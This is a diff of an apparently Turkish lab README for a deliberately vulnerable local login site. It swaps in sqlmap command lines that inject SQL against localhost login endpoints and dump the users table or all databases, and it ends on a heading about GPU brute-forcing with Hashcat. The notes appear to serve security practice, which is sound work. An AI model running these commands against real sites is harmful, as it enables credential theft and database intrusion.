@@ -14,19 +14,14 @@ tarayıcınızdan localhost:3000 adresine giderek siteyi görüntüleyebilirsini
 
 ---- SQL MAP İLE SQL INJECTION DENEME KOMUTLARI:
 
-py sqlmap.py -u "http://localhost:3000/login" --data="username=test&password=test" --tables 
+py sqlmap.py -u "http://localhost:3000/login" --data="username=Kerim_Emre&password=123456" --dbms=sqlite -D SQLite_masterdb -T users --dump --batch --threads=10 --hex --flush-session
 
-py sqlmap.py -u "http://localhost:3000/login" --data="username=test&password=test" --dbms=sqlite --technique=BUT --risk=3 --level=5 --batch -T users --dump --hex --flush-session --keep-alive --timeout=30
-
-çıktıyı dosyaya kaydetmek için:
-py sqlmap.py -u "http://localhost:3000/login" --data="username=test&password=test" --dbms=sqlite --technique=BUT --risk=3 --level=5 --batch -T users --dump --hex --flush-session --keep-alive --timeout=30 > sqlmap_results.txt 2>&1
 
 önbellek temızleme
 py sqlmap.py --flush-session
 
 ÇALIŞAN SQLMAP KOMUT
-py sqlmap.py -u "http://localhost:3000/vulnerable_login" --data="username=test&password=test" --method=POST --dbms=sqlite --level=5 --risk=3 --technique=B --dump-all --batch --ignore-code=500 --tamper=space2comment --random-agent
-
+py sqlmap.py -u "http://localhost:3000/vulnerable_login" --method POST --data "username=test&password=test" --dump-all --batch --flush-session
 
 
 ---- Hashcat Cuda kullanarak Ekran kartımızla bruteforce saldırısı yapmak için:
